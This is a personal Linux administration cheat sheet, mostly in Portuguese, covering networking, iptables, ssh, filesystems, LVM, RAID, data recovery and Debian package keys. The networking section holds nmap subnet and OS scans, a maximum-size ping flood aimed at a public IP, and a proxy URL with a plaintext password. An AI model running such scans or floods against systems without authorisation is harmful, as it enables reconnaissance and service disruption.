# Dicas-ng

- [Rede](#Rede)
- [Sistemas de arquivos](#Sistemas-de-arquivos)
- [Pacotes](#Pacotes)
- [Systemd](#Systemd)
- [Gráfico](#Gráfico)
- [Hardware](#Hardware)
- [Boots](#Boots)
- [Utils](#Utils)
- [Geral](#Geral)

---

# Rede
<a href="#Dicas-ng">`^`</a>

### Creating the AP

Then if your interface is ath0:

      iwconfig ath0 mode Master
      iwconfig ath0 essid "LinuxAP"
      ifconfig ath0 192.168.1.1 up

      modprobe iptable_nat
      iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
      echo 1 > /proc/sys/net/ipv4/ip_forward

      modprobe iptable_nat
      iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
      echo 1 > /proc/sys/net/ipv4/ip_forward


### I chose an IP that wasn't in my wired LANs subnet.
### Now you should be able to see the AP if you scan for APs.

- Configure statically your client's card

 Then on the client side (if your interface is ath0) you do:

      # iwconfig ath0 mode Managed
      # iwconfig essid "LinuxAP"
      # iwconfig ap 00:11:22:AA:22:11
      # ifconfig ath0 192.168.1.10 netmask 255.255.255.0 up
      # route add -net default gw 192.168.1.1

- It's not always necessary to specify the mac address for the ap, but sometimes it's a good thing.
- As you can see I chose an ip that was in the same subnet as the ap, it's important.

### Redirect de uma porta pra outro server e porta de outra rede

    iptables -t nat -A PREROUTING -p tcp -i wlan0 -d ip-externo  --dport porta-externa -j DNAT --to-destination ip-interno:porta-interna


### Nome de interfaces

> Thanks.
> The name eth1_rename_ren worked for me. I use Debian etch. I am a common user and not a developer.

>I also explored into /etc/udev/init.d files. A file named z25_persistent-net .rules was there. It showed Mac ids and names for the same. I could see that I had two ethernet MAC ids with same name as eth0. Further I also had a ethernet MAC ID due to a card I attempted earlier, which had eth1 link.
>So I commented the old card entry and changed the name for one of the present cards to eth1.

>Now I have the names eth1 and eth0 for the two cards.

>I edited the /etc/network/interfaces files accordingly for eth0 and eth1, instead of eth0 and eth1_rename_ren.

>Now both cards are working.
>That was some fun. thanks.

### Se estiver atrás de um proxy, digite:

    $ export http_proxy="http://nomedousuario:senha@ipdoservidorproxy:portadoproxy"
    $ export ftp_proxy="http://nomedousuario:senha@ipdoservidorproxy:portadoproxy"
    $ export http_proxy="http://apt_user:x1x2x3x4@10.10.19.94:3128"

### O meu problema eh que quero q o arquivo /etc/resolv.conf não seja reescrito pelo dhcp da placa eth1
- edita  /etc/dhcp3/dhclient.conf e retira

      domain-name-servers

### nmap exemplos

    nmap -P0 -sT -F -O -A 192.168.1.1
    nmap -sS -sV 192.168.1.0/24
    nmap -A -T4 host
    nmap -p0- -v -A -T4 192.168.1.2

    ping -f -s 65507 201.83.25.213

    watch -n 1 -d ifconfig

    nmap -sS -n 192.168.15.*
    nmap -sP -n 192.168.15.*

### Para colocar uma rota direto no /etc/interfaces

    up route add -net 192.168.0.0 netmask 255.255.255.0 gw 192.168.1.254 dev eth0

- na linha de comando

        route add -net 192.168.15.0 netmask 255.255.255.0 gw 192.168.10.1 eth0
        route add -net 192.168.15.0/24 gw 192.168.10.1 eth0

### Para colocar no /etc/network/interfaces o wifi

    wpa_passphrase ssid-da-rede passphrase-da-rede

    auto wlan0
    iface wlan0 inet dhcp
    wpa-ssid ssid-da-rede
    wpa-psk aqui-coloca-os-numeros-do-comando-anterior

### Para conectar numa rede wifi via linha de comandos

    wpa_passphrase SUA-REDE A-CHAVE-DA-REDE > /etc/wpa.conf
    wpa_supplicant -c /etc/wpa.conf -i INTERFACE-WIFI

### Para redirecionar ssh e ouvir em outras interfaces além de localhost

- habilite:
> no sshd_config

        gatewayPorts yes

        ssh -R 2222:0.0.0.0:22 amigo@201.83.71.18

> abre a porta 2222 para mundo acessar 22 no host que iniciou conexão

> Printers that this howto covers (there are many, many others, but these are the printers that have been confirmed to work so far (also note that Dell's printers are merely rebranded Lexmarks):
> With that said, let's get to it!

> The driver we'll be using is the z600 one, which can be found here. Even if your printer isn't a z600 this driver works with a LOT of Lexmark's, so try this driver first.

> Download the driver, save it to a desktop folder such as `lexmark` (I say _folder_ because extracting the driver is a messy process!).

> Obviously, exclude the comments to the right of the hash (#) marks, I include them only to explain the commands.

> http://downloads.lexmark.com/cgi-perl/downloads.cgi?ccs=229:1:0:389:0:0&emeaframe=&fileID=1151

    $ mkdir lexmark
    $ mv CJLZ600LE-CUPS-1.0-1.TAR.gz lexmark # move the package to a folder. optional, but recommended.
    $ tar -xvzf CJLZ600LE-CUPS-1.0-1.TAR.gz # extract the driver.
    $ tail -n +143 z600cups-1.0-1.gz.sh > install.tar.gz # the sh script is broken for newer systems. use `tail` to extract the binary portion of the script.
    $ tar -xvzf install.tar.gz # extract the contents produced by tail
    $ alien -t z600cups-1.0-1.i386.rpm # convert unusable rpm packages to tgz.
    $ alien -t z600llpddk-2.0-1.i386.rpm # convert unusable rpm packages to tgz.
    $ sudo tar xvzf  z600llpddk-2.0.tgz -C / # extract the tgz's to / putting the files in their right place
    $ sudo tar xvzf z600cups-1.0.tgz -C / # extract the tgz's to / putting the files in their right place
    $ sudo ldconfig # DO NOT SKIP THIS STEP or your printer backend won't find required libraries
    $ cd /usr/share/cups/model
    $ sudo gunzip Lexmark-Z600-lxz600cj-cups.ppd.gz # unzip the ppd, which should _not_ be gzipped

    /etc/rc2.d/S19cupsys restart

    $ cd /usr/lib/cups/backend
    $ ./z600


### scp sem scp !!

    cat xcalc.pkg |ssh root@10.0.0.1 "cat > /cfg/pkgs/xcalc.pkg"

    ssh gnu.works 'tar -cf - *png ' > pngs.tar
    ssh gnu.works 'tar -cf - *png ' | tar -xf -

### fully qualified domain name, using 127.0.1.1 for ServerName
- colocar no /etc/hosts

        192.168.1.31 orsi.eletrofit.com.br

### Dnat

    iptables -t nat -I PREROUTING -p tcp --dport 6000 -j DNAT --to-dest 10.0.0.1

### Para fazer DNAT:

    iptables -t nat -A PREROUTING -t nat -p tcp -d 192.168.1.101 --dport 3389 -j DNAT --to 192.168.254.13:3389

### Para consultar em um determinado dns um domínio

    host -a jpl.com.br ns1.dreamhost.com

### Aquele que sempre esqueço !!
> country code top-level domain (ccTLD)

### Resolver nome netbios
    nmblookup

### Block ip
    iptables -I INPUT -s IP-ADDRESS -j DROP

### Para ver a resposta do servidor dhcp
    dhcpcd-bin -T wlan0

    nmap --script broadcast-dhcp-discover -e wlan0

### Dnat

    iptables -I PREROUTING -t nat -p tcp --dport 8200 -j DNAT --to 192.168.1.253:22

### Que tal subir um servidor HTTP com 1 linha de comando e usando Python?
    python -m SimpleHTTPServer
    python -m http.server 80

### Wakeup on lan
    wakeonlan -i 192.168.1.255 00:23:ae:ff:b7:b8

### Passando por proxy:
- corkscrew
- no ~/.ssh/config

        ProxyCommand corkscrew proxy.work.com 3128 %h %p ~/.ssh/myauth

- no ~/.ssh/myauth

    colocar host senha

### ssh e scp ipv6

    scp user@\[ipv6\]:~/
    ssh user@ipv6
    ssh user@ipv6%eth1

### Checando ip
    ping -c 3 -w2 172.16.5.16 >/dev/null && echo "ip up" || echo "ip down"

### Desabilitar ipv6 `
    echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6

### network manager via linha de comando
    nmtui

### ssh antigo roteador
    ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@192.168.1.1
qdo cai broken pipe

Set option via CLI
You can set the IPQoS option via the command-line whenever you connect like this:

    ssh example.com -o IPQoS=throughput
Set option in SSH config
You can set the IPQoS option in the config file (e.g. $HOME/.ssh/config) like this:

### Saber se placa tem link sem precisar ethtool
    cat /sys/class/net/eth0/operstate
    down

### Para checar o sinal das redes

    DEVICE=$(iw dev | grep Interface | cut -d " " -f2)
    iw dev $DEVICE scan | egrep "SSID|signal|\(on"

### Desligar turn off wifi inteface
    ip link set dev <interface> down

### Ligar turn on
    ip link set dev <interface> up

### Evitando Mac address randômico

    printf '[device]\nwifi.scan-rand-mac-address=0\n' > /etc/NetworkManager/conf.d/10-scan-rand-mac.conf

### Use ssh-agent in Mate

- First, start the ssh-agent on startup. Edit your shell startup script (~/.bashrc, ~/.zshrc, etc.) and add the following snippet:


        # Start SSH agent
        if [ -z "$SSH_AUTH_SOCK" ] ; then
          eval `ssh-agent -s`
        fi

- Now edit your SSH config file to add keys on first use to the agent. Add the following snippet to ~/.ssh/config:

        Host *
           AddKeysToAgent yes

### Saindo de uma sessão presa de ssh

    ~.

### Acesso com virt-manager remotamente

    virt-manager -c 'qemu+ssh://USUARIO@SERVIDOR:PORTA/system?keyfile=CHAVE-PUBLICA'
    virt-manager -c 'qemu+ssh://myuser@192.168.1.139:2222/system?keyfile=id_rsa'
    virt-manager -c 'qemu+ssh://kretcheu@192.168.15.18/system?keyfile=.ssh/id_rsa.pub'

caso tenha prblemas pode testar conectividade com:

    virsh --connect qemu+ssh://USUARIO@IP/system
    virsh --connect qemu+ssh://kretcheu@192.168.15.18/system

### Rodando Vm via qemu

    qemu-system-x86_64 -enable-kvm -M q35 -smp 2 -m 4G -drive file=buster.qcow2,if=virtio -net nic,model=virtio -net user,hostfwd=tcp::2222-:22 -vga virtio -display sdl,gl=on

### pegar IP de saída.

    wget -qO - icanhazip.com

### Obtendo infos do dispositivo e da rede wi-fi

    nmcli device show wlan0

### Conectando em rede oculta com nmcli

    nmcli c add type wifi con-name NOME-DA-CONEXÃO ifname INTERFACE-WIFI ssid REDE-WIFI
    nmcli c modify NOME-DA-CONEXÃO wifi-sec.key-mgmt wpa-psk wifi-sec.psk CHAVE-DA-REDE
    nmcli c up NOME-DA-CONEXÃO

### Descobrir ip externo

    host myip.opendns.com resolver1.opendns.com
    host -4 myip.opendns.com resolver1.opendns.com

    dig TXT +short o-o.myaddr.l.google.com @ns1.google.com
    dig -4 TXT +short o-o.myaddr.l.google.com @ns1.google.com

### Para testar dlna

    nmap -sU -p 1900 --script=upnp-info ip-servidor-dlna

# Sistemas de arquivos
<a href="#Dicas-ng">`^`</a>

### Para montar com privilégios para um user

    mount -t ntfs /dev/hda1 /mnt/windows -o uid=1000

### Criar imagem cd/dvd

    mkisofs -o ../cd_part.iso -J -r -b boot_win98.img /home/kretcheu/receive/part/

- dvd

        mkisofs -dvd-video -o dvd.iso dir/raiz/do/dvd

- abaixo desse dir tem os diretórios `'AUDIO_TS VIDEO_TS'`

### Para apagar tosos os arquivos bak de dir e sub-dirs

    find . -type f -name "*.bak" | xargs -i bash -c "echo removendo '{}'; rm '{}'"

    find /home/asterisk/monitor -name "*.WAV" -mtime +480 -delete -print

- para mover vários pensando no tamanho

        find . -type f -size -1M | xargs -i bash -c "echo movendo '{}'; mv '{}' ../menos.de.11 "
        find . -type f -size +1M | xargs -i bash -c "echo movendo '{}'; mv '{}' ../mais.de.1 "

- para não ter problemas com os espaços nos nomes dos arquivos

        find -type d -print0 | xargs -0 ls -ld
        cat arquivo | xargs -I{} rm {}

- arquivo contém uma lista de nomes de arquivos.

        scp user@host:/path/to/directory\\\ with\\\ spaces/file ~/Downloads
        scp ze@192.168.1.3:D3-141\\\ TP7\\\ detalhes\\\ 1\\\ de\\\ 7.dwg

### Para remover ou mover o arquivo mais recente

    ls -Art | tail -n 1 |xargs rm
    ls -Art | tail -n 1 |xargs mv -t diretorio-destino

### Para montar um compartilhamento cifs com suporte a grandes arquivos (lfs)

    mount -t smbfs //192.168.0.2/temp -o lfs,username="ze luiz%senha",workgroup=xxx /mnt/

    //172.16.100.1/salas  /home/aluno/pasta  cifs  user=sa0911,password=,iocharset=utf8,sec=ntlm  0  0

### Definindo versão do CIFS

    mount -t cifs //192.168.0.33/Compartilhada -o username=guest,password="",vers=2.0,sec=ntlm  -v /mnt

### Montar fs ssh

    aptitude install sshfs
    modprobe fuse
    sshfs kretcheu@192.168.0.3:/home /mnt

### Para montar um disco virtual do vmware
### para ver a tabela de partições

    vmware-mount.pl -p disco_virtual.vmdk

### para montar

    vmware-mount.pl disco_virtual.vmdk 1 /mnt/

    kpartx -av <image-flat.vmdk>
    mount -o /dev/mapper/loop0p1 /mnt/vmdk

### para converter

    qemu-img convert -O qcow disk1.vmdk disk1.qcow2

> lembrar de no grub trocar /dev/sdaX por /dev/vdaX
> rodar update-grub

### para mudar o tamanho do qcow

    qemu-img resize image.qcow2 +SIZE

### Usando -exec com find

    find /home/apf/backup -name *bak -exec ls -l {} \;

- colocando g+s em dirs que não tem

        find . -type d ! -perm /g+s -exec chmod g+s {} \;

- colocando os arquivos no grupo tecnico se não fizer parte dele (1010)

        find ! -group  1010 -exec chown .tecnico {} \;

### undelete reiserfs

    reiserfsck --rebuild-tree -S -l /root/recovery.log /dev/hda3

- veja: --rebuild-sb, --check --scan-whole-partition

        cd /home/lost+found

### Recovery Deleted files on reiserfs file system

> Unmount that partition. e.g., umount /home
> Find out what actual device this partition refers to. You can usually get this information from the file /etc/fstab. We'll assume here that the device is /dev/hda3.
> Run the command: reiserfsck --rebuild-tree -S -l /root/recovery.log /dev/hda3

> You need to be root to do this. Read the reiserfsck man page for what these options do and for more options. Some interesting options are '--rebuild-sb, --check'

> After the command finishes, which might be a long time for a big partition, you can take a look at the logfile /root/recovery.log if you wish.

> Mount your partition: mount /home

> Look for the lost+found directory in the root of the partition. Here, that would be:

>  /home/lost+found

> This directory contains all the files that could be recovered. Unfortunately, the filenames are not preserved for a lot of files. You'll find some sub-directories - filenames withing those are preserved!

### Para ler o conteúdo do initrd

- primeiro copiar initrd.img para algum lugar com extensão gz (no meu caso)

        gunzip initrd.img.gz
        mkdir initrd
        cd initrd
        cat ../initrd.img | cpio -i --no-absolute-filenames

        lsinitramfs /boot/initrd.img-5.0.4-gnu

### Criar um tar incluindo apenas alguns arquivos:
- criar a lista:

        find project -type f -print | egrep '(\.[ch]|[Mm]akefile)$' > Include
        tar cvf project.tar -T Include

        find |grep es.php |grep -v svn >incluir
        tar -cvf es.tar -T incluir

        find ./ -type f -name "*.mp4" -exec tar uvf /mnt/videos.tar {} + 

### Para recuperar arquviso de audio e fotos
- no curupira

        photorec /log /d /mnt/sdb1/ /dev/sda

### Para saber o UUID

    vol_id /dev/sda1

### LVM

    fdisk /dev/sda t 6 8e

    pvcreate /dev/sda6
    vgcreate igen /dev/sda6
    lvcreate -L 100G -n dados igen

    lvextend -L 100G /dev/igen/home
    xfs_growfs -L 150G /dev/igen/home

    pvs
    vgs
    pvdisplay
    vgdisplay

### Sincronizando

    rsync -av --update --delete /diretorio/origem /diretorio/destino/
    rsync -r -a -v -e "ssh -l ignez" /home/ze 192.168.1.5:/home/backup/

 Esse comando vai copiar o conteúdo do diretório ¿origem¿ para o ¿diretório¿ destino.

 -a significa archive (arquivamento) equivale as opções -rlptgoD
 -v significa verbose, ele vai te mostrar informações da sincronização
 --update atualiza arquivos mais novos que existam na /origem no /destino
 --delete apaga arquivos que não existam mais na /origem no /destino

### How to loop mount image files with several partitions

- Image files for embedded devices often have several partitions in them. To loop mount them locally we have to calculate the offset of the partition within the image. Here we go:

    * We list the partition table within the image file using sectors as units:

            fdisk -l -u openwrt-x86-ext2.image

      Device Boot Start End Blocks Id System
      openwrt-x86-ext2.image1 * 63 9071 4504+ 83 Linux
      openwrt-x86-ext2.image2 9135 107855 49360+ 83 Linux
    * The start value is the offset in sectors, we have to convert into bytes. Let us assume we want to mount the second partition:

            echo $((9135 * 512))
            4677120

    * Use this value as mount offset:

            mount -o loop,offset=4677120 openwrt-x86-ext2.image /mnt

- mais simples -

### fdisk -lu android-x86-4.4-r2.img
```
= start 2048 > 2048*512 = 1048576
ou rode:

    parted android-x86-4.4-r2.img -s unit b print

    losetup -o 1048576 /dev/loop0 android-x86-4.4-r2.img
    mount /dev/loop0 /mnt/
    losetup -d /dev/loop0

    losetup -P /dev/loop0 android-x86-4.4-r2.img
    mount /dev/loop0p1 /mnt
    losetup -d /dev/loop0
```

### Montar imagem qcow2
    modprobe nbd max_part=8
    qemu-nbd --connect=/dev/nbd0 maquinas.virtuais/debian-jessie.img
    fdisk -l /dev/nbd0

    modprobe nbd
    qemu-nbd -c /dev/nbd0 luks.qcow2
    fdisk -l /dev/nbd0

- caso não mapeie as partições.

        kpartx -a /dev/nbd0
        kpartx -d /dev/nbd0

        qemu-nbd -d /dev/nbd0
        modprobe -r nbd

### vmware kisk vmdk

    modprobe nbd
    qemu-nbd  -rc /dev/nbd1  Whonix-Gateway-XFCE-14.0.1.3.8-disk001.vmdk

### Para ver partições

    fdisk -l /dev/nbd1
    mount /dev/nbd1p1 /mnt/

    qemu-nbd -d /dev/nbd1
    modprobe -r nbd

###  Para descobrir os uuids

    blkid

#### Para mudar
    uuidgen

 f0acce91-a416-474c-8a8c-43f3ed3768f9
 Finally apply the new UUID to the partition

 This is also another command, tune2fs, which will apply our new UUID to our device path:

    tune2fs /dev/sde5 -U f0acce91-a416-474c-8a8c-43f3ed3768f9

### Badblocks
    badblocks -o badblocks_encontrados.dat -n -v /dev/sda5
    dd if=/dev/hda1 of=/dev/hdb1 bs=4k conv=noerror,sync

    badblocks -vs /dev/sdx
    badblocks -nvs /dev/sdx

### Montando ntfs definindo iso
    mount.ntfs-3g -o locale=en_US.iso88591 /dev/sdb1 /backup/

### para usar um arquivo de imagem como hd virtual

- criando um disco de 100 Mbytes

        dd if=/dev/zero of=disco-virtual bs=1M count=100

- para usá-lo como loop

        losetup /dev/loop0 disco-virtual

- para criar as partições vou criar uma com 40 Mb e outra com restante do espaço

         fdisk /dev/loop0
         n p <enter> +40M<enter>
         n p <enter> <enter>
         w

- vendo as partições

        fdisk -ul /dev/loop0


Disk /dev/loop0: 104 MB, 104857600 bytes
4 heads, 32 sectors/track, 1600 cylinders, total 204800 sectors
Units = sectors of 1 * 512 = 512 bytes


   Device Boot      Start         End      Blocks   Id  System
/dev/loop0p1              32       78207       39088   83  Linux
/dev/loop0p2           78208      204799       63232   83  Linux

- repare que a primeira partição vai do 32 setor ao 78207 e a segunda do 78208 ao 204799

	32 * 512 = 16384
	78208 *512 = 40042496

- para criar novos dispositivos loop para cada partição

        losetup -o 16384 /dev/loop1 /dev/loop0
        losetup -o 40042496 /dev/loop2 /dev/loop0

	assim /dev/loop = todo o dispositivo
        /dev/loop1 = primeira partição
	/dev/loop2 = segunda partição

        losetup -P /dev/loop0 disco-virtual

- para criar um sistema de arquivos

        mkfs.ext3 /dev/loop1
        mkfs.vfat /dev/loop2

- para montar

        mount /dev/loop1 /media/part1
        mount /dev/loop2 /media/part2

- os pontos de montagem /media/part1 e /media/part2, foram criados com:

        mkdir /media/part1 /media/part2

- pronto ! feito.

### Lista de arquivos
    find . -type d \( -name sys -o -name tmp -o -name dev -o -name proc -o -name home \) -prune -o -print  |tee /home/kretcheu/files

### Lendo hd com criptografia
    ecryptfs-recover-private
fornecer a chave(senha do user) da chave privada

### Depois de um -o bind /dev

      umount -l /mnt/dev

### para mudar o label vfat
    edit ~/.mtoolsrc
    drive i: file="/dev/sda1"

    $mcd i:
    mlabel -s i:
    mlabel i:my-ipod

    fatlabel /dev/device
    fatlabel /dev/device novo-label

### para mudar o label ext
    e2label /dev/device
    e2label /dev/device novo-label

### PhotoRec
    wget http://www.cgsecurity.org/testdisk-6.13-WIP.linux26.tar.bz2

### Converter ext3 to ext4
    tune2fs -O extents,uninit_bg,dir_index /dev/sdb1
    fsck -pf /dev/sdb1

### Diretório com criptografia

    aptitude install ecryptfs-utils

    mkdir diretorio
    mount -t ecryptfs diretorio diretorio

    Passphrase: *********
    Select cipher: aes
    Select key bytes: 24
    Enable plaintext passthrough (y/n) [n]:
    Enable filename encryption (y/n) [y]:

    cat /root/.ecryptfs/sig-cache.txt
    0def15b393ec41c6

    cat /root/.ecryptfsrc
    ecryptfs_unlink_sigs
    ecryptfs_fnek_sig=0def15b393ec41c6
    ecryptfs_key_bytes=24
    ecryptfs_cipher=aes
    ecryptfs_sig=0def15b393ec41c6
    ecryptfs_passthrough=n

no fstab

        diretorio diretorio ecryptfs rw,ecryptfs_unlink_sigs,ecryptfs_fnek_sig=0def15b393ec41c6,ecryptfs_sig=0def15b393ec41c6,ecryptfs_cipher=aes,ecryptfs_key_bytes=24,user,noauto 0 0

### find arquivos ocultos
    find -name \.\*

### find arquivos recentes 1 mês
    find . -type f -mtime -30 -exec ls -l {} \; > last30days.txt
    find . -type f -mtime -30 -printf "%M %u %g %TR %TD %p\n" > last30days.txt

### Para listar o conteúdo de um initrd
    lsinitramfs -l /boot/initrd.img-3.18.5-gnu

### quota
    aptitude install quota
    editar /etc/fstab -> usrquota,grpquota
    touch aquota.user aquota.group
    chmod 600 aquota.*

    mount -o remount /home
    quotaoff -a
    quotacheck -F vfsv0 -afcvdugm

    edquota -u usuario

### chmod sem permissão de execução
    ls -l /bin/chmod
    -rw-r--r-- 1 root root 55944 Mar 14  2015 /bin/chmod
    /lib64/ld-linux-x86-64.so.2 /bin/chmod +x /bin/chmod

### Tinha um arquivo com nome esdruxulo que impedia um find |grep x
    j=1; num=1;for i in `cat lixo`;  do j=$(($j+$num)); echo $i >caraio$j ; done

### dd com progresso
    dd if=/dev/urandom | pv | dd of=/dev/null
    dd if=debian.iso of=/dev/sdb bs=16M oflag=sync status=progress

### dd para pendrive
    dd if=debian.iso of=/dev/sdb bs=16M oflag=sync status=progress

### Renomear vários arquivos
    rename 's/\.html$/\.php/' *.
    rename  's/-[0123456789]*.mp4/.mp4/;' *mp4

### Recuperando dados
    ddrescue -f -n  /dev/sda7 /mnt/fabi/particao /mnt/fabi/mapfile
    ddrescue -d -r3 /dev/sda7 /mnt/fabi/particao /mnt/fabi/mapfile
    mount -o loop,ro /mnt/fabi/particao /pto.montagem
    fsck.??? /mnt/fabi/particao

it is much easier and faster to just use a tool designed for data recovery like ddrescue.
It tries to rescue the good parts first in case of read errors.
Also you can interrupt the rescue at any time and resume it later at the same point.

Run it twice:

First round, copy every block without read error and log the errors to rescue.log.
    ddrescue -f -n /dev/sdX /dev/sdY rescue.log

Second round, copy only the bad blocks and try 3 times to read from the source before giving up.
    ddrescue -d -f -r3 /dev/sdX /dev/sdY rescue.log

Now you can mount the new drive and check the file system for corruption.

Rescue the most important part of the disc first.

    ddrescue -i0 -s50MiB /dev/sdc hdimage mapfile
    ddrescue -i0 -s1MiB -d -r3 /dev/sdc hdimage mapfile

Then rescue some key disc areas.

    ddrescue -i30GiB -s10GiB /dev/sdc hdimage mapfile
    ddrescue -i230GiB -s5GiB /dev/sdc hdimage mapfile

Now rescue the rest (does not recopy what is already done).

    ddrescue /dev/sdc hdimage mapfile
    ddrescue -d -r3 /dev/sdc hdimage mapfile

### Foremost
    foremost -i hdimage -t jpg -T -v
    foremost -i hdimage -t avi,mpg,mov -T -v

### Montar lvm
    modprobe dm-mod
    vgscan
    vgchange -ay VolGroup00
    lvs
    mount /dev/VolGroup00/LogVol00 /mnt/

### Pau de mdadm depois do transplante
incluir raid=noautodetect

    GRUB_CMDLINE_LINUX_DEFAULT="quiet raid=noautodetect"

    mdadm --manage /dev/md0 --fail /dev/sdb2
    mdadm --assemble --readonly /dev/md0 /dev/sdb2

    mdadm --create /dev/md1 -l 1 -n 2 /dev/sda missing

### Removendo raid superblock

    mdadm --zero-superblock /dev/sda1
    mdadm --zero-superblock /dev/sda2

    a partir daí a partição pode ser usada normalmente

### /etc/mdadm/mdadm.conf
    ARRAY <ignore> UUID=3f620e6d:4e655d66:b931eb71:baf7cf3a

### Defrag ext4
    mount /dev/sdb3 /mnt
    e4defrag -c /mnt

### Usando tar para transferir arquivos com tudo no lugar
    tar -cvf - /etc/* | tar -x

### Nome de hds ssd
Não Vou Me Esquecer n1p2
nvme0n1p2

### Montando dynamic disk SFS partitioning

    apt install ldmtool
    ldmtool scan
    ldmtool create all

    mount /dev/mapper/ldm_vol_X3-Dg0_Volume1 /mnt

### Windows zika ntfs partição

Metadata kept in Windows cache, refused to mount
When dual booting with Windows 8 or 10, trying to mount a partition that is visible to Windows may yield the following error:

The disk contains an unclean file system (0, 0).
Metadata kept in Windows cache, refused to mount.
Failed to mount '/dev/sdc1': Operation not permitted
The NTFS partition is in an unsafe state. Please resume and shutdown
Windows fully (no hibernation or fast restarting), or mount the volume
read-only with the 'ro' mount option.
The problem is due to a feature introduced in Windows 8 called "fast startup". When fast startup is enabled, part of the metadata of all mounted partitions are restored to the state they were at the previous closing down. As a consequence, changes made on Linux may be lost. This can happen to any NTFS partition when selecting "Shut down" or "Hibernate" under Windows 8 or 10. Leaving Windows by selecting "Restart", however, is apparently safe.

To enable writing to the partitions on other operating systems, be sure fast startup is disabled. This can be achieved by issuing as an administrator the command:

powercfg /h off
You can check the current settings on Control Panel > Hardware and Sound > Power Options > System Setting > Choose what the power buttons do. The box Turn on fast startup should either be disabled or missing.

Deleting Windows hibernate metadata
As an alternative to above clean shutdown method, there is a way to completely destroy NTFS metadata that was saved after hibernating. This method is only feasible if you are not able or unwilling to boot into Windows and shut it down completely. This is by placing remove_hiberfile option when you are mounting your NTFS file system using ntfs-3g.

    mount -t ntfs-3g -o remove_hiberfile /dev/your_NTFS_partition /mount/point

### To decompress 7z
    p7zip --decompress ~/Downloads/CUEHaliLight.7z

- o default apaga o arquivo 7z.

### using tar to sync dirs: rsync de pobre

    cd /old-debian
    tar -cv * | tar -xC /new-debian/

### Pegar o UUID da partição vfat
    dd bs=1 skip=39 count=4 if=/dev/sda1 2>/dev/null | xxd -plain -u | sed -r 's/(..)(..)(..)(..)/\4\3-\2\1/'
    9EF7-9816

### Para reler a tabela de partições

    partprobe


### Para setar flag da partição
No disco /dev/sda quero ver detalhes das partições e particioamento:

    parted -l /dev/sda

Para setar a flag de legacy boot para dar boot mbr com partição GPT na partição 3.

    parted /dev/sda set 3  "legacy_boot" on

Para remover a flag

    parted /dev/sda set 3  "legacy_boot" off

### Para recuperar uma tabela de particinamento GPT

    gdisk /dev/sdb
    r - recovery
    b - copiar o backup para a principal
    w - gravar

### Para recuperar um sistema de arquivos ext4

Para descobrir os números dos superblocos
    mkfs.ext4 -n /dev/sdb1

```
mke2fs -n /dev/sdb1
mke2fs 1.42.13 (17-May-2015)

Creating filesystem with 1464843008 4k blocks and 183107584 inodes
Filesystem UUID: 1ac318a6-7953-42d5-8d7b-0597c54e1935
Superblock backups stored on blocks:
        32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208,
        4096000, 7962624, 11239424, 20480000, 23887872, 71663616, 78675968,
        102400000, 214990848, 512000000, 550731776, 644972544
```
com os números em mãos:

    e2fsck -y -b 102400000 /dev/sdb1

### Descobrir qual sistema de arquivos de uma partição

    fsck -N /dev/sdc3

### Lendo e alterando serial number FAT UUID

The volume ID of FAT32 is stored in the first sector at offset 67 (0x43), for FAT16 it's at 39 (0x27).
One can use the dd command to read it (replace /dev/sdc1 with your real partition):

```
dd bs=1 skip=67 count=4 if=/dev/sdc1 2>/dev/null \
| xxd -plain -u \
| sed -r 's/(..)(..)(..)(..)/\4\3-\2\1/'

```

And, of course, one can also store a new UUID (replace 1234-ABCD with your desired value):
```
UUID="1234-ABCD"
printf "\x${UUID:7:2}\x${UUID:5:2}\x${UUID:2:2}\x${UUID:0:2}" \
| dd bs=1 seek=67 count=4 conv=notrunc of=/dev/sdc1
```

ou ainda:

```
mlabel -n -N "0586393B" :: -i /dev/vda1
```

###  Alterando o percentual reservado para o root
```
tune2fs -m 0 /dev/sdb1
```
### Data da crição sistema de arquivos

```
tune2fs -l /dev/sda1
```

### Salvando tabela de partições
```
sfdisk -d /dev/sdX > tabela
```

## Restaurando tabela de partiçôes
```
sfdisk /dev/sdX < tabela
```

## Swapfile no sistema de arquivos btrfs
```
>> /swapfile
chattr +C /swapfile
lsattr /swapfile

dd if=/dev/zero of=/swapfile count=4096 bs=1MiB
chmod 0600 /swapfile
mkswap /swapfile
swapon /swapfile
```
### Verificando espaço ocupado incluindo diretórios ocultos
```
du -sch .[!.]* * |sort -h
du -ad 1 --si | sort -h

```

### Expandindo luks
```
Apagar as partições
```
fdisk /dev/nvme0n1
```

Criar novas aumentando, lembrar de **NÃO** apagar assinatura.

```
cryptsetup resize /dev/mapper/criptografado
resize2fs /dev/mapper/criptografado
```

### Luks2 que funcona no GRUB 2.06

```
cryptsetup  luksFormat --type luks2 /dev/loop1p2 --pbkdf=PBKDF2
```
O módulo do grub chama luks2. Até esse momento não está no Debian, usei Parabola

# Pacotes

### Quando um novo xorg.conf não é criado com

    dpkg-reconfigure xserver-xorg

    sh -c "readlink /etc/X11/X | md5sum > /var/lib/x11/X.md5sum"

    vi /var/lib/dpkg/info/xserver-xorg.postinst


- substituir:

        if [ -z "$UPGRADE" ] || dpkg --compare-versions "$2" le "1:7.0.14"; then

- por:

        if [ true ] ; then


### No keyserver known (use option --keyserver)

- para definir de qual server baixar

        gpg --keyserver pgp.mit.edu --recv-keys 1F41B907

- colocando a chave

        gpg --export F42584E6 | apt-key add -

- para definir qual server usar sempre

- se não tiver uma chave de repositório

        gpg --recv-keys 8B48AD6246925553
        gpg --export 8B48AD6246925553| apt-key add -

### Corrigindo erros de Chave Pública no Debian

> Introdução

> A partir da versão 0.6, incluída no Debian Etch, o apt-get passou a utilizar o sistema GPG de encriptação o qual é composto de uma chave pública e uma privada para a verificação de autenticidade dos pacotes. Isso significa, na prática, que se alguém quiser agir de ma fé e modificar um pacote dos repositórios oficiais e distribuí-lo como se fosse o pacote original ele não poderá fazê-lo já que o malfeitor não terá a chave privada original para encriptar o pacote. Então no final das contas você que é usuário comum ficará mais seguro com este sistema.

> O meu caso`

> Por este motivo o apt algumas vezes dá um errinho de chave pública não autenticada e isso normalmente ocorre quando você não está usando no seu sources.list (/etc/apt/sources.list) um repositório oficial debian.

> No meu caso eu tive este problema adicionando o repositório:

> deb ftp://ftp.nerim.net/debian-marillat/ etch main

### Repositórios antigos

    deb http://archive.debian.org/debian/ etch main

